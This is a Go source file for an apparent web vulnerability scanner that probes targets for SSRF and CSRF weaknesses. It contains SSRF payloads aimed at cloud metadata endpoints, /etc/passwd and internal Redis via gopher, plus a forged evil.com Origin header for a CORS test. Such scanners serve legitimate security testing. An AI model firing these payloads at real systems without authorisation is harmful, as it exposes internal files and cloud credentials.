package csrfssrf

import (
	"fmt"
	"net/url"
	"strings"
	"sync"
	"time"

	"webattack/pkg/httpclient"
	"webattack/pkg/payloads"
	"webattack/pkg/utils"

	"github.com/fatih/color"
)

// Finding represents a CSRF or SSRF finding
type Finding struct {
	URL       string
	Parameter string
	Type      string // "csrf", "ssrf"
	Payload   string
	Severity  string
	Detail    string
	Evidence  string
}

// Scanner tests for CSRF and SSRF vulnerabilities
type Scanner struct {
	client    *httpclient.Client
	results   []Finding
	mu        sync.Mutex
	verbose   bool
	callbackURL string // For out-of-band detection
}

// NewScanner creates a new CSRF/SSRF scanner
func NewScanner(client *httpclient.Client, verbose bool) *Scanner {
	return &Scanner{
		client:  client,
		verbose: verbose,
	}
}

// SetCallbackURL sets a callback URL for OOB detection
func (s *Scanner) SetCallbackURL(url string) {
	s.callbackURL = url
}

// Scan runs both CSRF and SSRF tests
func (s *Scanner) Scan(targetURL string) ([]Finding, error) {
	s.results = nil

	fmt.Printf("[*] Starting CSRF/SSRF vulnerability scan on: %s\n", targetURL)

	// Run SSRF tests
	fmt.Printf("[1/2] Testing SSRF vulnerabilities...\n")
	s.testSSRF(targetURL)

	// Run CSRF tests
	fmt.Printf("[2/2] Testing CSRF vulnerabilities...\n")
	s.testCSRF(targetURL)

	return s.results, nil
}

// testSSRF tests for Server-Side Request Forgery
func (s *Scanner) testSSRF(targetURL string) {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return
	}

	params := parsed.Query()

	// Find potential SSRF parameters
	ssrfParamNames := []string{
		"url", "uri", "path", "src", "source", "target",
		"dest", "destination", "redirect", "redirect_uri",
		"link", "href", "fetch", "load", "proxy",
		"file", "document", "image", "img", "resource",
		"endpoint", "host", "domain", "callback", "return",
	}

	testParams := make(map[string]string)

	// Check existing parameters
	if len(params) > 0 {
		for param, values := range params {
			lowerParam := strings.ToLower(param)
			for _, ssrfName := range ssrfParamNames {
				if strings.Contains(lowerParam, ssrfName) {
					val := ""
					if len(values) > 0 {
						val = values[0]
					}
					testParams[param] = val
					break
				}
			}
			// Also test any parameter that already contains a URL
			if len(values) > 0 && (strings.HasPrefix(values[0], "http://") ||
				strings.HasPrefix(values[0], "https://")) {
				testParams[param] = values[0]
			}
		}
	}

	// If no SSRF-like parameters, try common ones
	if len(testParams) == 0 {
		for _, name := range ssrfParamNames {
			testParams[name] = "https://example.com"
		}
	}

	// Test SSRF payloads
	var wg sync.WaitGroup
	sem := make(chan struct{}, 3)

	for param, _ := range testParams {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			s.testSSRFParameter(targetURL, p)
		}(param)
	}
	wg.Wait()
}

func (s *Scanner) testSSRFParameter(targetURL, param string) {
	if s.verbose {
		fmt.Printf("[*] Testing SSRF on parameter '%s'...\n", param)
	}

	ssrfPayloads := []string{
		"http://127.0.0.1:80",
		"http://localhost:80",
		"http://0.0.0.0:80",
		"http://[::1]:80",
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/",
		"file:///etc/passwd",
		"file:///c:/windows/system32/drivers/etc/hosts",
		"gopher://127.0.0.1:6379/_INFO",
		"dict://127.0.0.1:6379/INFO",
	}

	if s.callbackURL != "" {
		ssrfPayloads = append(ssrfPayloads, s.callbackURL)
	}

	for _, payload := range ssrfPayloads {
		testURL := s.injectParam(targetURL, param, payload)
		resp, err := s.client.Get(testURL)
		if err != nil {
			continue
		}

		bodyStr := string(resp.Body)

		// Check for SSRF indicators
		ssrfIndicators := []string{
			"root:x:",          // /etc/passwd
			"daemon:x:",        // /etc/passwd
			"[fonts]",          // Windows ini
			"mysql",            // MySQL response
			"redis",            // Redis response
			"instance-id",      // AWS metadata
			"ami-id",           // AWS metadata
			"security-groups",  // AWS metadata
			"google",           // GCP metadata
		}

		for _, indicator := range ssrfIndicators {
			if strings.Contains(strings.ToLower(bodyStr), strings.ToLower(indicator)) {
				s.addFinding(Finding{
					URL:       testURL,
					Parameter: param,
					Type:      "ssrf",
					Payload:   payload,
					Severity:  "high",
					Detail:    fmt.Sprintf("SSRF confirmed - internal resource accessed via %s", payload),
					Evidence:  fmt.Sprintf("Response contains: %s", indicator),
				})
				fmt.Printf("    [SSRF] Confirmed! Parameter '%s' with payload '%s'\n", param, payload)
				return
			}
		}

		// Check for AWS-style error (indicates the request was made)
		if resp.StatusCode == 200 && strings.Contains(bodyStr, "169.254.169.254") {
			s.addFinding(Finding{
				URL:       testURL,
				Parameter: param,
				Type:      "ssrf",
				Payload:   payload,
				Severity:  "high",
				Detail:    "SSRF to AWS metadata endpoint appears possible",
				Evidence:  fmt.Sprintf("HTTP %d, Size: %d", resp.StatusCode, len(resp.Body)),
			})
			fmt.Printf("    [SSRF] Potential! Parameter '%s' with payload '%s'\n", param, payload)
		}
	}
}

// testCSRF tests for Cross-Site Request Forgery
func (s *Scanner) testCSRF(targetURL string) {
	resp, err := s.client.Get(targetURL)
	if err != nil {
		return
	}

	bodyStr := string(resp.Body)

	// Find forms
	forms := utils.ExtractForms(bodyStr)

	if len(forms) == 0 {
		if s.verbose {
			fmt.Println("    No forms found on page")
		}
		return
	}

	fmt.Printf("    Found %d forms on page\n", len(forms))

	// Check each form for CSRF tokens
	for _, form := range forms {
		hasCSRFToken := false

		// Look for various CSRF token patterns
		csrfPatterns := []string{
			"csrf", "xsrf", "_token", "nonce",
			"authenticity_token", "_csrf_token",
			"csrfmiddlewaretoken", "csrf-token",
			"__RequestVerificationToken",
		}

		for _, pattern := range csrfPatterns {
			if strings.Contains(strings.ToLower(bodyStr), pattern) {
				hasCSRFToken = true
				break
			}
		}

		if !hasCSRFToken {
			s.addFinding(Finding{
				URL:      targetURL,
				Type:     "csrf",
				Severity: "high",
				Detail:   fmt.Sprintf("Form '%s' lacks CSRF protection token", form),
				Evidence: "No CSRF token found in form",
			})
			fmt.Printf("    [CSRF] Form '%s' missing CSRF token!\n", form)
		}
	}

	// Check for SameSite cookie attribute (anti-CSRF)
	setCookies := resp.Header.Values("Set-Cookie")
	for _, cookie := range setCookies {
		if !strings.Contains(strings.ToLower(cookie), "samesite") {
			s.addFinding(Finding{
				URL:      targetURL,
				Type:     "csrf",
				Severity: "medium",
				Detail:   "Cookie missing SameSite attribute (CSRF protection)",
				Evidence: cookie,
			})
			fmt.Printf("    [CSRF] Cookie missing SameSite: %s\n", utils.Truncate(cookie, 60))
		}
	}

	// Check if CORS headers weaken CSRF protection
	req := s.client.NewRequest("GET", targetURL)
	req.SetHeader("Origin", "https://evil.com")
	resp2, err := req.Do()
	if err == nil {
		acao := resp2.Header.Get("Access-Control-Allow-Origin")
		acac := resp2.Header.Get("Access-Control-Allow-Credentials")
		if acao != "" && acac == "true" {
			s.addFinding(Finding{
				URL:      targetURL,
				Type:     "csrf",
				Severity: "high",
				Detail:   "CORS with credentials weakens CSRF protection",
				Evidence: fmt.Sprintf("ACAO: %s, ACAC: %s", acao, acac),
			})
		}
	}
}

func (s *Scanner) injectParam(targetURL, param, value string) string {
	parsed, _ := url.Parse(targetURL)
	q := parsed.Query()
	q.Set(param, value)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

func (s *Scanner) addFinding(f Finding) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.results = append(s.results, f)
}

// PrintResults prints findings
func PrintResults(results []Finding) {
	if len(results) == 0 {
		color.Green("\n[+] No CSRF/SSRF vulnerabilities found.")
		return
	}

	csrfCount := 0
	ssrfCount := 0
	for _, r := range results {
		if r.Type == "csrf" {
			csrfCount++
		} else {
			ssrfCount++
		}
	}

	color.Red("\n╔══════════════════════════════════════════════════════════╗")
	color.Red("║          CSRF/SSRF VULNERABILITIES FOUND                ║")
	color.Red("╚══════════════════════════════════════════════════════════╝\n")

	fmt.Printf("  CSRF: %d | SSRF: %d\n\n", csrfCount, ssrfCount)

	for i, r := range results {
		fmt.Printf("[%d] ", i+1)
		label := color.RedString("SSRF")
		if r.Type == "csrf" {
			label = color.YellowString("CSRF")
		}
		fmt.Printf("%s | %s\n", label, r.Detail)
		if r.Parameter != "" {
			fmt.Printf("    Parameter: %s\n", r.Parameter)
		}
		if r.Payload != "" {
			fmt.Printf("    Payload:   %s\n", r.Payload)
		}
		fmt.Printf("    Severity:  %s\n", strings.ToUpper(r.Severity))
		if r.Evidence != "" {
			fmt.Printf("    Evidence:  %s\n", r.Evidence)
		}
		fmt.Println()
	}
}

// Ensure package is used
var _ = payloads.SSRFPayloads
var _ = time.Now
